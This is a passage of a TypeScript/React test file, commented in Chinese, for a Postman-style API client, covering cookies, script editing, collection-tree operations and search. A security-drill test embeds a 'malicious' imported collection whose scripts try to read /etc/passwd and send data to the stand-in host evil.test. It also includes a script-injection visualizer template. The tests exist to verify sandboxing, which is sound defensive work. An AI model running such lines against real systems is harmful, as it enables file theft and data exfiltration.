  function cookie(overrides: Partial<CookieView> = {}): CookieView {
    return {
      id: 'ck-1',
      name: 'sid',
      domain: 'api.test',
      path: '/',
      host_only: true,
      value: 'abc123',
      secure: false,
      http_only: false,
      expires_at: 4_102_444_800,
      ...overrides,
    };
  }

  async function openCookiePanel(client: Commands) {
    render(<App client={client} />);
    fireEvent.click(await screen.findByText('Cookie'));
    await screen.findByTestId('cookie-panel');
  }

  it('按域分组呈现，同名不同域分别可见（8.5）', async () => {
    const { client } = harness({
      cookies: [
        cookie({ id: 'ck-1', domain: 'api.test', name: 'sid', value: 'a' }),
        cookie({ id: 'ck-2', domain: 'other.test', name: 'sid', value: 'b' }),
      ],
    });
    await openCookiePanel(client);

    const groups = screen.getAllByTestId('cookie-domain-group');
    expect(groups).toHaveLength(2);
    expect(groups[0].textContent).toContain('api.test');
    expect(groups[1].textContent).toContain('other.test');
    // 同名 Cookie 在两个域下各自可见
    expect(groups[0].textContent).toContain('sid=a');
    expect(groups[1].textContent).toContain('sid=b');
  });

  it('明确标注 Cookie 的作用域为应用级按域共享（8.7）', async () => {
    const { client } = harness();
    await openCookiePanel(client);

    const note = screen.getByTestId('cookie-scope-note');
    expect(note.textContent).toContain('整个应用');
    expect(note.textContent).toContain('切换工作区');
    expect(note.textContent).not.toContain('清空 Cookie。切换'); // 语义防呆：不是「会清空」
  });

  it('新增后立即出现在列表中，随后可被请求携带（8.5）', async () => {
    const { client, cookiePut } = harness();
    await openCookiePanel(client);

    fireEvent.change(screen.getByLabelText('Cookie 域'), { target: { value: 'api.test' } });
    fireEvent.change(screen.getByLabelText('Cookie 名称'), { target: { value: 'token' } });
    fireEvent.change(screen.getByLabelText('Cookie 取值'), { target: { value: 'v-1' } });
    fireEvent.click(screen.getByText('新增'));

    await waitFor(() => expect(cookiePut).toHaveBeenCalledTimes(1));
    const args = cookiePut.mock.calls[0][0] as CookieArgs;
    expect(args.domain).toBe('api.test');
    expect(args.name).toBe('token');
    expect(args.value).toBe('v-1');
    expect(args.path).toBe('/');

    // 列表刷新后可见（假实现真的记住了）
    await waitFor(() => expect(screen.getAllByTestId('cookie-entry')).toHaveLength(1));
    expect(screen.getByTestId('cookie-panel').textContent).toContain('token=v-1');
  });

  it('删除后条目从列表消失（8.5）', async () => {
    const { client, cookieDelete } = harness({
      cookies: [cookie({ id: 'ck-9' })],
    });
    await openCookiePanel(client);
    expect(screen.getAllByTestId('cookie-entry')).toHaveLength(1);

    fireEvent.click(screen.getByText('删除'));

    await waitFor(() => expect(cookieDelete).toHaveBeenCalledWith('ck-9'));
    await waitFor(() => expect(screen.queryByTestId('cookie-entry')).toBeNull());
  });
});

// ---------------------------------------------------------------------------
// 5.1 / 5.2 / 5.3 脚本编辑界面
// ---------------------------------------------------------------------------

describe('脚本编辑', () => {
  it('请求编辑器可编辑并保存前后置脚本，保存后再打开内容一致（5.1 / 5.3）', async () => {
    const { client, settingsSet } = harness();
    render(<App client={client} />);
    await openRequest();

    fireEvent.click(screen.getByText('Scripts'));
    const preArea = (await screen.findByLabelText('前置脚本')) as HTMLTextAreaElement;
    expect(preArea.value).toBe('');

    fireEvent.change(screen.getByLabelText('前置脚本'), {
      target: { value: 'pm.environment.set("a", "1");' },
    });
    // 两栏布局：后置脚本要在左栏点 Post-response 之后才进入右栏
    fireEvent.click(screen.getByText('Post-response'));
    fireEvent.change(screen.getByLabelText('后置脚本'), {
      target: { value: 'pm.test("ok", () => pm.expect(1).to.eql(1));' },
    });
    fireEvent.click(screen.getByText('保存'));

    await waitFor(() => expect(settingsSet).toHaveBeenCalledWith('script_gate', 'c1', 'allowed'));

    // 重新打开（模拟重启后的读取路径）：内容与保存前一致（5.3）
    // 左栏停留的相位会跟着编辑器一起保留，因此先点回 Pre-request
    fireEvent.click(tree().getByText('我的请求'));
    fireEvent.click(screen.getByText('Scripts'));
    fireEvent.click(screen.getByText('Pre-request'));
    await waitFor(() => {
      const reopened = screen.getByLabelText('前置脚本') as HTMLTextAreaElement;
      expect(reopened.value).toBe('pm.environment.set("a", "1");');
    });
    fireEvent.click(screen.getByText('Post-response'));
    const testArea = screen.getByLabelText('后置脚本') as HTMLTextAreaElement;
    expect(testArea.value).toBe('pm.test("ok", () => pm.expect(1).to.eql(1));');
  }, 30_000);

  it('集合脚本入口独立编辑，不触碰请求内容（5.2）', async () => {
    const { client, collectionSetScript } = harness();
    render(<App client={client} />);
    await openRequest();

    // 点集合名进入集合脚本面板
    fireEvent.click(tree().getByText('我的集合'));
    await screen.findByTestId('entity-script-panel');
    expect(screen.getByText('集合 · 我的集合')).toBeTruthy();

    fireEvent.change(screen.getByLabelText('集合前置脚本'), {
      target: { value: 'console.log("collection level");' },
    });
    fireEvent.click(screen.getByText('保存'));

    await waitFor(() =>
      expect(collectionSetScript).toHaveBeenCalledWith('c1', 'console.log("collection level");', null),
    );
  }, 30_000);

  it('文件夹脚本入口与集合独立（5.2）', async () => {
    const folder: Folder = {
      id: 'f1',
      collection_id: 'c1',
      parent_folder_id: null,
      name: '我的文件夹',
      description: null,
      auth: emptyAuth(),
      pre_request_script: null,
      test_script: null,
      sort_order: 0,
    };
    const { client, folderSetScript, collectionSetScript } = harness({ folder });
    render(<App client={client} />);
    await openRequest();

    fireEvent.click(screen.getByText('我的文件夹'));
    await screen.findByTestId('entity-script-panel');
    expect(screen.getByText('文件夹 · 我的文件夹')).toBeTruthy();

    fireEvent.change(screen.getByLabelText('文件夹前置脚本'), {
      target: { value: 'console.log("folder level");' },
    });
    fireEvent.click(screen.getByText('保存'));

    await waitFor(() =>
      expect(folderSetScript).toHaveBeenCalledWith('f1', 'console.log("folder level");', null),
    );
    // 三层互相独立：保存文件夹脚本不应碰集合的
    expect(collectionSetScript).not.toHaveBeenCalled();
  }, 30_000);
});

// ---------------------------------------------------------------------------
// 集合树：折叠 / 目录嵌套 / 改名 / 脚本两栏（rework-collection-tree-and-scripts）
// ---------------------------------------------------------------------------

function makeFolder(overrides: Partial<Folder> = {}): Folder {
  return {
    id: 'f1',
    collection_id: 'c1',
    parent_folder_id: null,
    name: '我的文件夹',
    description: null,
    auth: emptyAuth(),
    pre_request_script: null,
    test_script: null,
    sort_order: 0,
    ...overrides,
  };
}

/** 悬停节点行并打开它的操作菜单——操作入口默认不在界面上。 */
function openNodeMenu(name: string) {
  const row = tree().getByText(name).closest('.node') as HTMLElement;
  fireEvent.mouseOver(row);
  fireEvent.click(within(row).getByLabelText('更多操作'));
  return row;
}

describe('集合树的折叠与目录操作', () => {
  it('集合可以折叠，请求节点没有折叠控件（1.1）', async () => {
    render(<App client={harness({ folder: makeFolder() }).client} />);
    // 默认全展开：请求一开始就在树上
    expect(await tree().findByText('我的请求')).toBeTruthy();

    fireEvent.click(screen.getByLabelText('折叠 我的集合'));
    expect(tree().queryByText('我的请求')).toBeNull();
    expect(tree().getByText('我的集合')).toBeTruthy();

    fireEvent.click(screen.getByLabelText('展开 我的集合'));
    expect(tree().getByText('我的请求')).toBeTruthy();

    // 请求是叶子节点，没有折叠控件
    expect(screen.queryByLabelText('折叠 我的请求')).toBeNull();
  });

  it('折叠隐藏了当前选中的请求时，主区内容不被清空（1.1）', async () => {
    render(<App client={harness({ folder: makeFolder() }).client} />);
    await openRequest();

    fireEvent.click(screen.getByLabelText('折叠 我的集合'));
    expect((screen.getByLabelText('请求地址') as HTMLInputElement).value).toBe(
      'https://api.test/users',
    );
  });

  it('操作入口默认不显示，悬停后才出现（2.1）', async () => {
    render(<App client={harness({ folder: makeFolder() }).client} />);
    await tree().findByText('我的集合');

    // 静态渲染时不出现任何操作按钮
    expect(tree().queryAllByLabelText('更多操作')).toHaveLength(0);

    const row = tree().getByText('我的集合').closest('.node') as HTMLElement;
    fireEvent.mouseOver(row);
    expect(tree().getByLabelText('更多操作')).toBeTruthy();

    fireEvent.mouseOut(row);
    expect(tree().queryAllByLabelText('更多操作')).toHaveLength(0);
  });

  it('菜单可用 Esc 关闭（2.2）', async () => {
    render(<App client={harness({ folder: makeFolder() }).client} />);
    await tree().findByText('我的集合');

    openNodeMenu('我的集合');
    expect(tree().getByRole('menu')).toBeTruthy();

    fireEvent.keyDown(document, { key: 'Escape' });
    expect(tree().queryByRole('menu')).toBeNull();
  });

  it('菜单里的新建请求仍挂在正确的父级下（2.3）', async () => {
    const { client, requestCreate } = harness({ folder: makeFolder() });
    render(<App client={client} />);
    await tree().findByText('我的文件夹');

    openNodeMenu('我的文件夹');
    fireEvent.click(screen.getByText('新建请求'));

    await waitFor(() =>
      expect(requestCreate).toHaveBeenCalledWith(
        expect.objectContaining({ collection_id: 'c1', folder_id: 'f1' }),
      ),
    );
  });

  it('菜单可新建子文件夹，删除前必须确认（3.1 / 3.2）', async () => {
    const { client, folderCreate, folderDelete } = harness({ folder: makeFolder() });
    render(<App client={client} />);
    await tree().findByText('我的文件夹');

    openNodeMenu('我的文件夹');
    fireEvent.click(screen.getByText('新建子文件夹'));
    await waitFor(() => expect(folderCreate).toHaveBeenCalledWith('c1', 'f1', '新文件夹'));

    // 删除先弹确认条，取消不会调用后端
    openNodeMenu('我的文件夹');
    fireEvent.click(screen.getByText('删除文件夹'));
    await screen.findByTestId('folder-delete-confirm');
    fireEvent.click(screen.getByText('取消'));
    expect(folderDelete).not.toHaveBeenCalled();

    openNodeMenu('我的文件夹');
    fireEvent.click(screen.getByText('删除文件夹'));
    fireEvent.click(screen.getByText('删除'));
    await waitFor(() => expect(folderDelete).toHaveBeenCalledWith('f1'));
  });

  it('集合根也可以新建文件夹（3.1）', async () => {
    const { client, folderCreate } = harness();
    render(<App client={client} />);
    await tree().findByText('我的集合');

    openNodeMenu('我的集合');
    fireEvent.click(screen.getByText('新建文件夹'));
    await waitFor(() => expect(folderCreate).toHaveBeenCalledWith('c1', null, '新文件夹'));
  });

  it('集合与文件夹可改名，空名称被拒绝并还原（4.1 / 4.2 / 4.3）', async () => {
    const { client, collectionRename, folderRename } = harness({ folder: makeFolder() });
    render(<App client={client} />);
    await tree().findByText('我的集合');

    fireEvent.click(tree().getByText('我的集合'));
    await screen.findByLabelText('集合名称');
    // 改名走失焦提交（不再有「保存名称」按钮）
    expect(screen.queryByText('保存名称')).toBeNull();
    const collectionName = screen.getByLabelText('集合名称');
    fireEvent.change(collectionName, { target: { value: '新集合名' } });
    fireEvent.blur(collectionName);
    await waitFor(() => expect(collectionRename).toHaveBeenCalledWith('c1', '新集合名'));

    // 空名称：拒绝保存，并把输入框还原成原来的名称
    const again = screen.getByLabelText('集合名称');
    fireEvent.change(again, { target: { value: '   ' } });
    fireEvent.blur(again);
    await waitFor(() =>
      expect(screen.getByTestId('app-error').textContent).toContain('名称不能为空'),
    );
    expect((screen.getByLabelText('集合名称') as HTMLInputElement).value).toBe('我的集合');

    // 名称没变时（点进去又原样离开）不打后端
    fireEvent.blur(screen.getByLabelText('集合名称'));
    expect(collectionRename).toHaveBeenCalledTimes(1);

    fireEvent.click(tree().getByText('我的文件夹'));
    await screen.findByLabelText('文件夹名称');
    const folderName = screen.getByLabelText('文件夹名称');
    fireEvent.change(folderName, { target: { value: '改名后的文件夹' } });
    // 回车同样提交
    fireEvent.keyDown(folderName, { key: 'Enter' });
    await waitFor(() => expect(folderRename).toHaveBeenCalledWith('f1', '改名后的文件夹'));
  });

  it('脚本两栏可切换，左栏标记另一段已有内容（5.1）', async () => {
    const { client } = harness({
      request: makeRequest({ pre_request_script: 'pm.environment.set("a", "1");' }),
    });
    render(<App client={client} />);
    await openRequest();
    fireEvent.click(screen.getByText('Scripts'));

    await screen.findByLabelText('前置脚本');
    expect(screen.getByTestId('script-dot-pre')).toBeTruthy();
    expect(screen.queryByTestId('script-dot-test')).toBeNull();

    fireEvent.click(screen.getByText('Post-response'));
    await screen.findByLabelText('后置脚本');
    expect(screen.queryByLabelText('前置脚本')).toBeNull();

    // 切回来内容仍然保留
    fireEvent.click(screen.getByText('Pre-request'));
    expect((screen.getByLabelText('前置脚本') as HTMLTextAreaElement).value).toBe(
      'pm.environment.set("a", "1");',
    );
  });
});

describe('脚本错误不丢失响应（9.5）', () => {
  it('后置脚本抛错后，响应内容仍可正常查看', async () => {
    const scripted = makeRequest({ test_script: 'throw new Error("后置炸了");' });
    const { client, sendRequest } = harness({ request: scripted });

    render(<App client={client} />);
    await openRequest();
    fireEvent.click(screen.getByText('发送'));

    await waitFor(() => expect(sendRequest).toHaveBeenCalled());
    // 响应元数据照常呈现，脚本错误另行报告而不顶掉响应
    expect((await screen.findByTestId('status')).textContent).toContain('200');
    expect(await screen.findByText(/后置脚本/)).toBeTruthy();
  }, 30_000);

  it('请求本身失败时，前置脚本已经产生的输出仍然可见', async () => {
    const scripted = makeRequest({
      pre_request_script: 'console.log("前置输出：请求还没发");',
    });
    const { client, sendRequest } = harness({ request: scripted });
    // 离线、DNS、证书等都会走到这条路径：请求失败不该连带丢掉脚本输出
    sendRequest.mockRejectedValueOnce(new Error('连接失败'));

    render(<App client={client} />);
    await openRequest();
    fireEvent.click(screen.getByText('发送'));

    expect((await screen.findByTestId('app-error')).textContent).toContain('连接失败');

    // 「脚本」标签在**没有响应**时也要出现，否则前置输出无处可见
    fireEvent.click(await screen.findByText('脚本'));
    expect((await screen.findByTestId('script-console')).textContent).toContain(
      '前置输出：请求还没发',
    );
  }, 30_000);
});

describe('可视化结果（4.6）', () => {
  it('visualizer 模板被渲染进 sandbox="" 的 iframe，模板脚本不执行', async () => {
    const scripted = makeRequest({
      test_script:
        'pm.visualizer.set(\'<p id="viz">{{name}}</p><script>window.__vizPwned = true;</script>\', { name: "reqman" });',
    });
    const { client, sendRequest } = harness({ request: scripted });

    render(<App client={client} />);
    await openRequest();
    fireEvent.click(screen.getByText('发送'));

    await waitFor(() => expect(sendRequest).toHaveBeenCalled());

    const frame = await screen.findByTestId('visualizer-frame');
    // 与响应预览同一条隔离边界：不授予任何允许项
    const sandbox = frame.getAttribute('sandbox');
    expect(sandbox).toBe('');
    expect(sandbox ?? '').not.toContain('allow-scripts');
    // 模板脚本未在应用上下文执行
    expect((globalThis as Record<string, unknown>).__vizPwned).toBeUndefined();
  }, 30_000);
});

// ---------------------------------------------------------------------------
// 10.1 / 10.3 端到端：导入文档 → 门禁确认 → 发送 → 脚本生效 / 安全演练
// ---------------------------------------------------------------------------

/** Postman v2.1 文档的最小形状，只声明本测试用到的字段。 */
interface DocEvent {
  listen?: string;
  script?: { exec?: string[] };
}
interface DocRequestItem {
  name?: string;
  request?: { method?: string; url?: { raw?: string } };
  event?: DocEvent[];
}
interface DocFolderItem {
  name?: string;
  item?: DocRequestItem[];
  event?: DocEvent[];
}
interface PostmanDoc {
  info?: { name?: string };
  item?: DocFolderItem[];
  event?: DocEvent[];
}

function docScript(events: DocEvent[] | undefined, listen: string): string | null {
  const found = (events ?? []).find((entry) => entry.listen === listen);
  const exec = found?.script?.exec;

  return Array.isArray(exec) && exec.length > 0 ? exec.join('\n') : null;
}

function workspaceVariable(name: string, value: string): Variable {
  return {
    id: `v-${name}`,
    scope: 'global',
    owner_id: 'w1',
    name,
    is_secret: false,
    initial: { state: 'value', value },
    current: { state: 'value', value },
  };
}

/**
 * 端到端 harness：复用通用 harness 的桩，只覆盖链路真正经过的部分。
 *
 * 与通用 harness 的差别只有两点，但两点都关键：
 * 其一，**导入会改变后续读取到的实体**——树、集合、文件夹、请求在导入后返回文档里的
 * 内容，脚本也由 `docScript` 从粘贴的文档中取出，因此真正执行的就是用户导入的那几段，
 * 而不是测试另行塞进去的常量；
 * 其二，门禁初始**未授权**（settings 里没有 `script_gate:<集合>`），因此发送必然先撞上门禁。
 */
function e2eHarness(documentText: string, options: { policy?: string } = {}) {
  const doc = JSON.parse(documentText) as PostmanDoc;
  const folderItem = doc.item?.[0];
  const requestItem = folderItem?.item?.[0];

  const importedCollection: Collection = {
    ...collection,
    name: doc.info?.name ?? '导入的集合',
    pre_request_script: docScript(doc.event, 'prerequest'),
    test_script: docScript(doc.event, 'test'),
  };
  const importedFolder: Folder = {
    id: 'f1',
    collection_id: 'c1',
    name: folderItem?.name ?? '文件夹',
    description: null,
    auth: emptyAuth(),
    pre_request_script: docScript(folderItem?.event, 'prerequest'),
    test_script: docScript(folderItem?.event, 'test'),
    sort_order: 0,
  };
  const importedRequest = makeRequest({
    name: requestItem?.name ?? '导入的请求',
    folder_id: 'f1',
    method: requestItem?.request?.method ?? 'GET',
    url: requestItem?.request?.url?.raw ?? 'https://api.test/users',
    pre_request_script: docScript(requestItem?.event, 'prerequest'),
    test_script: docScript(requestItem?.event, 'test'),
  });

  const base = harness({});
  const settings = new Map<string, string>();
  const globalsSetCalls: unknown[][] = [];
  const variableSetCalls: Record<string, unknown>[] = [];
  const sendRequest = vi.fn(async () => response());
  let imported = false;

  const importPostman = vi.fn(async (_workspaceId: string, source: ImportSourceArgs) => {
    // 导入必须把用户粘贴的文档原样交给后端，而不是测试里悄悄换掉实体
    expect(source.text).toBe(documentText);
    imported = true;
    return importOutcome();
  });
  const globalsSet = vi.fn(async (...args: unknown[]) => {
    globalsSetCalls.push(args);
    return workspaceVariable('order', '');
  });
  const variableSet = vi.fn(async (input: Record<string, unknown>) => {
    variableSetCalls.push(input);
    return workspaceVariable(String(input.name ?? ''), String(input.current ?? ''));
  });

  const client: Commands = {
    ...base.client,
    workspaceTree: async () => (imported ? treeWith(importedRequest, importedFolder) : []),
    collectionGet: async () => importedCollection,
    folderGet: async () => importedFolder,
    requestGet: async () => importedRequest,
    importPostman,
    sendRequest,
    globalsSet,
    variableSet,
    settingsGet: async (scope: string, key: string) => {
      const stored = settings.get(`${scope}:${key}`);
      if (stored !== undefined) return stored;
      // 门禁与其它设置一律「未配置」；策略按入参给出（10.3 需要「已配置」形态）
      if (scope === 'script_send_request' && key === 'policy') return options.policy ?? null;
      return null;
    },
    settingsSet: async (scope: string, key: string, value: string) => {
      settings.set(`${scope}:${key}`, value);
    },
  };

  return { client, sendRequest, importPostman, globalsSet, globalsSetCalls, variableSetCalls };
}

/** 走一遍真实的导入界面：粘贴文档 → 导入。 */
async function importDocument(text: string) {
  // 工作区就绪前「导入/导出」是禁用的（disabled={!workspaceId}），先等它可用
  const toggle = screen.getByText('导入/导出') as HTMLButtonElement;
  await waitFor(() => expect(toggle.disabled).toBe(false));

  fireEvent.click(toggle);
  const area = await screen.findByLabelText('粘贴 Postman 文档');
  fireEvent.change(area, { target: { value: text } });
  fireEvent.click(screen.getByText('导入粘贴内容'));
}

/** 10.1 的导入文档：集合、文件夹、请求三级脚本，外加三条断言（其中一条故意失败）。 */
const THREE_LEVEL_DOC = JSON.stringify({
  info: {
    name: '导入的集合',
    schema: 'https://schema.getpostman.com/json/collection/v2.1.0/collection.json',
  },
  event: [
    {
      listen: 'prerequest',
      script: {
        exec: [
          "pm.globals.set('order', (pm.globals.get('order') || '') + 'C');",
          "console.log('集合层前置');",
        ],
      },
    },
    { listen: 'test', script: { exec: ["console.log('集合层后置');"] } },
  ],
  item: [
    {
      name: '导入的文件夹',
      event: [
        {
          listen: 'prerequest',
          script: {
            exec: ["pm.globals.set('order', (pm.globals.get('order') || '') + 'F');"],
          },
        },
      ],
      item: [
        {
          name: '导入的请求',
          request: { method: 'GET', url: { raw: 'https://api.test/users' } },
          event: [
            {
              listen: 'prerequest',
              script: {
                exec: [
                  "pm.globals.set('order', (pm.globals.get('order') || '') + 'R');",
                  "console.log('请求层前置');",
                ],
              },
            },
            {
              listen: 'test',
              script: {
                exec: [
                  "pm.test('状态码为 200', function () { pm.expect(pm.response.code).to.eql(200); });",
                  "pm.test('故意失败的一条', function () { pm.expect(1).to.eql(2); });",
                  "pm.test('失败不阻断后续断言', function () { pm.expect(true).to.be.true; });",
                  "console.log('请求层后置');",
                ],
              },
            },
          ],
        },
      ],
    },
  ],
});

/** 10.3 的导入文档：恶意脚本尝试直接联网、读文件、把变量外发出去。 */
const MALICIOUS_DOC = JSON.stringify({
  info: {
    name: '恶意集合',
    schema: 'https://schema.getpostman.com/json/collection/v2.1.0/collection.json',
  },
  item: [
    {
      name: '文件夹',
      item: [
        {
          name: '恶意请求',
          request: { method: 'GET', url: { raw: 'https://api.test/users' } },
          event: [
            {
              listen: 'prerequest',
              script: {
                exec: [
                  "pm.test('没有 fetch', function () { pm.expect(typeof fetch).to.eql('undefined'); });",
                  "pm.test('没有 XMLHttpRequest', function () { pm.expect(typeof XMLHttpRequest).to.eql('undefined'); });",
                  "pm.test('没有 localStorage', function () { pm.expect(typeof localStorage).to.eql('undefined'); });",
                  "var fileRead = 'succeeded';",
                  "try { require('fs').readFileSync('/etc/passwd'); } catch (e) { fileRead = 'blocked'; }",
                  "pm.test('读文件被拒绝', function () { pm.expect(fileRead).to.eql('blocked'); });",
                ],
              },
            },
            {
              listen: 'test',
              script: {
                exec: [
                  'await new Promise(function (resolve) {',
                  "  pm.sendRequest('https://evil.test/collect', function (err) {",
                  "    console.log('外发 evil.test:', err ? '被拒绝' : '已发出');",
                  '    resolve();',
                  '  });',
                  '});',
                  'await new Promise(function (resolve) {',
                  "  pm.sendRequest('https://api.test/ok', function (err) {",
                  "    console.log('外发 api.test:', err ? '被拒绝' : '已发出');",
                  '    resolve();',
                  '  });',
                  '});',
                ],
              },
            },
          ],
        },
      ],
    },
  ],
});

describe('端到端串联（10.1）', () => {
  it('导入含三级脚本与断言的集合：门禁确认后发送，脚本按集合→文件夹→请求生效', async () => {
    const { client, sendRequest, importPostman, globalsSet, globalsSetCalls } =
      e2eHarness(THREE_LEVEL_DOC);
    render(<App client={client} />);

    // 导入：文档原样交给后端，随后树里出现导入的请求
    await importDocument(THREE_LEVEL_DOC);
    await waitFor(() => expect(importPostman).toHaveBeenCalled());
    fireEvent.click(await screen.findByText('导入的请求'));
    await screen.findByLabelText('请求地址');

    // 门禁：新导入集合的脚本尚未获准执行，发送前必须确认，且说明将获得的能力
    fireEvent.click(screen.getByText('发送'));
    const gate = await screen.findByTestId('script-gate');
    expect(gate.textContent).toContain('导入的集合');
    expect(gate.textContent).toContain('pm.sendRequest');
    expect(sendRequest).not.toHaveBeenCalled();

    fireEvent.click(screen.getByText('允许执行（记住此集合）'));
    await waitFor(() => expect(sendRequest).toHaveBeenCalled());

    // 三级脚本都执行了，且顺序是集合 → 文件夹 → 请求：'CFR' 只能由这个顺序产生
    // （每一级读到的都是上一级写入的值——跨段可见性靠宿主回喂作用域）
    expect(globalsSetCalls).toEqual([['w1', 'order', 'CFR', false]]);
    // 写入必须先于发送：变量解析发生在后端发送时，写入晚于发送就静默失效
    expect(globalsSet.mock.invocationCallOrder[0]).toBeLessThan(
      sendRequest.mock.invocationCallOrder[0],
    );

    // 响应内容可正常查看
    expect((await screen.findByTestId('response-body')).textContent).toBe('{}');

    // 断言明细：通过两条、失败一条并给出原因，且失败不阻断其后的断言
    fireEvent.click(await screen.findByText('脚本'));
    await screen.findByTestId('script-report');
    expect(screen.getAllByTestId('assertion-pass')).toHaveLength(2);
    const failed = screen.getByTestId('assertion-fail');
    expect(failed.textContent).toContain('故意失败的一条');
    expect(failed.querySelectorAll('td')[2].textContent).not.toBe('');
    expect(screen.getByTestId('script-report').textContent).toContain('失败不阻断后续断言');

    // console 输出可见，且能区分来自前置还是后置
    const consoleText = screen.getByTestId('script-console').textContent ?? '';
    expect(consoleText).toContain('请求层前置');
    expect(consoleText).toContain('请求层后置');
    const phases = [...screen.getByTestId('script-console').querySelectorAll('li')].map((item) =>
      item.getAttribute('data-phase'),
    );
    expect(phases).toContain('prerequest');
    expect(phases).toContain('test');
  }, 60_000);
});

describe('安全演练（10.3）', () => {
  it('恶意集合走完导入到发送：门禁提示、无法联网与读文件、外发只走策略允许的路径', async () => {
    const { client, sendRequest } = e2eHarness(MALICIOUS_DOC, {
      // 策略只放行 api.test；未配置时 Postman 行为是不限制，这条演练要的是「已配置」
      policy: JSON.stringify({ mode: 'allow', hosts: ['api.test'] }),
    });
    render(<App client={client} />);

    await importDocument(MALICIOUS_DOC);
    fireEvent.click(await screen.findByText('恶意请求'));
    await screen.findByLabelText('请求地址');

    // 门禁给出提示，而不是静默执行
    fireEvent.click(screen.getByText('发送'));
    const gate = await screen.findByTestId('script-gate');
    expect(gate.textContent).toContain('恶意集合');
    expect(gate.textContent).toContain('网络请求');

    fireEvent.click(screen.getByText('允许执行（记住此集合）'));
    await waitFor(() => expect(sendRequest).toHaveBeenCalled());

    fireEvent.click(await screen.findByText('脚本'));
    await screen.findByTestId('script-report');

    // 沙箱内没有直接联网与持久化原语，读文件被拒绝：这四条断言全部通过，
    // 即脚本报告的「逃逸全部失败」——判定由沙箱本身给出，不是宿主代它说
    expect(screen.queryByTestId('assertion-fail')).toBeNull();
    expect(screen.getAllByTestId('assertion-pass')).toHaveLength(4);

    // 外发：策略允许的目标照常发出，策略外的目标被拒
    const consoleText = screen.getByTestId('script-console').textContent ?? '';
    expect(consoleText).toContain('外发 evil.test: 被拒绝');
    expect(consoleText).toContain('外发 api.test: 已发出');

    // 关键断言：被拒的外发**没有触达后端发送命令**——拒绝发生在桥的出口，不是发出去再失败
    const scriptCalls = sendRequest.mock.calls.map((call) => call[0] as {
      inline?: { url?: string };
    });
    expect(scriptCalls.filter((input) => input.inline?.url?.includes('evil.test'))).toEqual([]);
    expect(scriptCalls.filter((input) => input.inline?.url === 'https://api.test/ok')).toHaveLength(
      1,
    );
  }, 60_000);
});

// ---------------------------------------------------------------------------
// 集合树搜索与导入入口（change: add-collection-search-and-env-management）
// ---------------------------------------------------------------------------

/** 树里出现过的所有名字（集合名 + 集合与文件夹名 + 请求名），便于断言裁剪结果。 */
function flattenNames(trees: CollectionTree[]): string[] {
  const walk = (nodes: TreeNode[]): string[] =>
    nodes.flatMap((node) => [node.name, ...walk(node.children)]);
  return trees.flatMap((tree) => [tree.collection.name, ...walk(tree.children)]);
}

function requestNode(name: string, url: string, id = name): TreeNode {
  return {
    kind: 'request',
    id,
    name,
    sort_order: 0,
    children: [],
    request: makeRequest({ id, name, url }),
  };
}

function folderNode(name: string, children: TreeNode[], id = name): TreeNode {
  return { kind: 'folder', id, name, sort_order: 0, children };
}

/** 一棵覆盖「命中集合名 / 命中文件夹名 / 只命中请求」三种情形的树。 */
function searchableTrees(): CollectionTree[] {
  return [
    {
      collection,
      children: [
        folderNode('用户', [
          requestNode('登录', 'https://api.test/login'),
          requestNode('登出', 'https://api.test/logout'),
        ]),
        requestNode('健康检查', 'https://api.test/health'),
      ],
    },
  ];
}

describe('集合树的搜索（add-collection-search-and-env-management）', () => {
  it('filterTrees：请求名与 URL 都参与匹配，文件夹名命中保留整棵子树（2.1）', () => {
    const trees = searchableTrees();

    // 空查询：原样返回同一引用，不产生新数组
    expect(filterTrees(trees, '')).toBe(trees);
    expect(filterTrees(trees, '   ')).toBe(trees);

    // 请求名命中：只留下它自己，承载它的集合与文件夹仍在
    const byName = filterTrees(trees, '登录');
    expect(flattenNames(byName)).toEqual(['我的集合', '用户', '登录']);

    // URL 命中：名字里没有 health，命中的是路由
    expect(flattenNames(filterTrees(trees, 'api.test/healt'))).toEqual([
      '我的集合',
      '健康检查',
    ]);

    // 文件夹名命中：整棵子树都保留
    expect(flattenNames(filterTrees(trees, '用户'))).toEqual([
      '我的集合',
      '用户',
      '登录',
      '登出',
    ]);

    // 集合名命中：整棵树都保留
    expect(flattenNames(filterTrees(trees, '我的集合'))).toEqual([
      '我的集合',
      '用户',
      '登录',
      '登出',
      '健康检查',
    ]);

    // 无命中：空数组，而不是「保留了空壳」
    expect(filterTrees(trees, '绝对不存在')).toEqual([]);
  });

  it('搜索按名称裁剪树，命中路径自动展开且折叠控件失能（2.2 / 2.3）', async () => {
    render(<App client={harness({ folder: makeFolder() }).client} />);
    await tree().findByText('我的请求');

    // 先手动折叠，制造「命中项被折叠藏起来」的情形
    fireEvent.click(screen.getByLabelText('折叠 我的集合'));
    expect(tree().queryByText('我的请求')).toBeNull();

    fireEvent.change(screen.getByLabelText('搜索请求'), { target: { value: '我的请求' } });

    expect(tree().getByText('我的请求')).toBeTruthy();
    // 展开是被强制的，折叠按钮必须显式失能，否则会出现「点了没反应」的哑状态
    expect((screen.getByLabelText('折叠 我的集合') as HTMLButtonElement).disabled).toBe(true);

    // 清空搜索：回到用户原来的折叠状态（过滤没动过 collapsed）
    fireEvent.change(screen.getByLabelText('搜索请求'), { target: { value: '' } });
    expect(tree().queryByText('我的请求')).toBeNull();
    expect(screen.queryByLabelText('折叠 我的集合')).toBeNull();
  });

  it('搜索可命中请求路由；无命中时给出空态且不清空选中（2.4）', async () => {
    render(<App client={harness().client} />);
    await openRequest();

    fireEvent.change(screen.getByLabelText('搜索请求'), {
      target: { value: 'api.test/users' },
    });
    expect(tree().getByText('我的请求')).toBeTruthy();

    fireEvent.change(screen.getByLabelText('搜索请求'), { target: { value: '绝对不存在' } });
    expect(await screen.findByTestId('tree-search-empty')).toBeTruthy();
    expect(tree().queryByText('我的请求')).toBeNull();

    // 过滤结果不含选中项，但主区照旧显示它
    expect((screen.getByLabelText('请求地址') as HTMLInputElement).value).toBe(
      'https://api.test/users',
    );
  });

  it('工具栏同时提供搜索与两个图标按钮，导入复用同一个模态（3.1 / 3.2）', async () => {
    render(<App client={harness().client} />);
    await tree().findByText('我的集合');

    // tab 名已经是 Collections，行内不再有重复的「集合」标题
    expect(tree().queryByText('集合')).toBeNull();
    expect(tree().getByLabelText('搜索请求')).toBeTruthy();
    expect(tree().getByLabelText('新建集合')).toBeTruthy();

    fireEvent.click(tree().getByLabelText('导入'));
    expect(await screen.findByTestId('import-export-panel')).toBeTruthy();
  });

  it('从集合树导入后树得到刷新，搜索框内容保持不变（3.4）', async () => {
    const { client, importPostman } = harness();
    render(<App client={client} />);
    await tree().findByText('我的集合');

